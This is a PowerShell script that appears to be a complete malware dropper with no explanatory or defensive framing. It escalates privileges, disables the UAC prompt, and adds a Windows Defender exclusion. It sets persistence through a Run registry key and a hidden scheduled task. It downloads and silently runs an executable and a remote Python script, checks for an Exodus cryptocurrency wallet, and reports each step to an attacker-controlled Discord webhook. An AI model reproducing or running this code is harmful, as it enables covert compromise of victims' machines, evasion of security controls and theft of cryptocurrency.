# Initialize webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"

# Function to send log to webhook with rate limit handling
function Send-LogToWebhook {
    param (
        [string]$message
    )
    $body = @{ content = $message } | ConvertTo-Json
    $attempt = 0
    $success = $false
    while (-not $success -and $attempt -lt 3) {
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
            $success = $true
        }
        catch {
            $attempt++
            if ($_.Exception.Response.StatusCode -eq 429) {
                $retryAfter = [int]$_.Exception.Response.Headers['Retry-After']
                if ($retryAfter -gt 0) {
                    Start-Sleep -Seconds $retryAfter
                }
                else {
                    Start-Sleep -Seconds (5 * $attempt)  # Fallback exponential backoff
                }
            }
            else {
                Start-Sleep -Seconds (5 * $attempt)
            }
            if ($attempt -eq 3) {
                Write-Error "Failed to send webhook message after 3 attempts: $_"
            }
        }
    }
}

# Check if running as admin and attempt elevation
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Attempting to elevate privileges"
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden
        Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Started elevated instance, exiting non-elevated script"
        exit 0  # Exit the non-elevated script if elevation is attempted
    }
    catch {
        Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to elevate privileges, continuing without admin rights: $_"
    }
}
else {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Running with admin privileges"
}

# Initialize variables
$installFolder = (Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Get-Random) ?? "C:\Program Files"
$exePath = Join-Path $installFolder "scripthelper.exe"
$exeUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
$maxRetries = 3
$baseDelay = 1000
$maxDelay = 10000

# Simplified retry function with exponential backoff
function Invoke-Retry {
    param (
        [ScriptBlock]$Action
    )
    $retryCount = 0
    while ($retryCount -lt $maxRetries) {
        try {
            & $Action
            return
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Action failed after $maxRetries retries: $_"
                return
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            Start-Sleep -Milliseconds $delay
        }
    }
}

# Create and hide install folder
try {
    if (-not (Test-Path $installFolder)) {
        New-Item -Path $installFolder -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path $installFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
        Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created and hid install folder: $installFolder"
    }
}
catch {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create or hide install folder: $_"
}

# Disable UAC prompt (requires admin)
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Disabled UAC prompt"
}
catch {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to disable UAC prompt (admin required): $_"
}

# Add Windows Defender exclusion for the install folder (requires admin)
Invoke-Retry {
    try {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions -notcontains $installFolder) {
            Add-MpPreference -ExclusionPath $installFolder -ErrorAction Stop
            Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added Defender exclusion for $installFolder"
        }
    }
    catch {
        Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add Defender exclusion (admin required): $_"
    }
}

# Add EXE to startup registry (requires admin)
try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "ScriptHelper"
    $regValue = "`"$exePath`""
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -ErrorAction Stop
        Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added registry startup entry for $exePath"
    }
}
catch {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add registry startup entry (admin required): $_"
}

# Create scheduled task for EXE (requires admin)
try {
    $taskName = "ScriptHelperTask"
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute $exePath
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Script Helper Task" -ErrorAction Stop
        Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created scheduled task: $taskName"
    }
}
catch {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create scheduled task (admin required): $_"
}

# Download and execute scripthelper.exe
$webClient = $null
try {
    Invoke-Retry {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($exeUrl, $exePath)
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
            Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully downloaded and executed $exePath"
        }
        else {
            throw "File not found at $exePath"
        }
    }
}
catch {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to download or execute scripthelper.exe: $_"
}
finally {
    if ($webClient) { $webClient.Dispose() }
}

# Execute Python script in memory
$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
try {
    $null = python --version 2>&1
    if ($LASTEXITCODE -eq 0) {
        Invoke-Retry {
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.0")
            $pythonScriptContent = $webClient.DownloadString($pythonScriptUrl)
            if ($pythonScriptContent) {
                $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processInfo.FileName = "python"
                $processInfo.Arguments = "-"
                $processInfo.RedirectStandardInput = $true
                $processInfo.UseShellExecute = $false
                $processInfo.CreateNoWindow = $true
                $process = [System.Diagnostics.Process]::Start($processInfo)
                $process.StandardInput.Write($pythonScriptContent)
                $process.StandardInput.Close()
                $process.WaitForExit(30000)
                Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully executed Python script"
            }
        }
    }
}
catch {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to execute Python script: $_"
}
finally {
    if ($webClient) { $webClient.Dispose() }
    if ($process) { $process.Dispose() }
}

# Check for Exodus folder and send Discord webhook notification
try {
    $path = "C:\Users\admin\AppData\Roaming\Exodus"
    $user = $env:USERNAME
    $msg = if (Test-Path $path) { "@everyone Exists! User: $user" } else { "Does not Exist! User: $user" }
    $body = @{ content = $msg } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Sent Discord webhook notification: $msg"
}
catch {
    Send-LogToWebhook "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to send Discord webhook: $_"
}
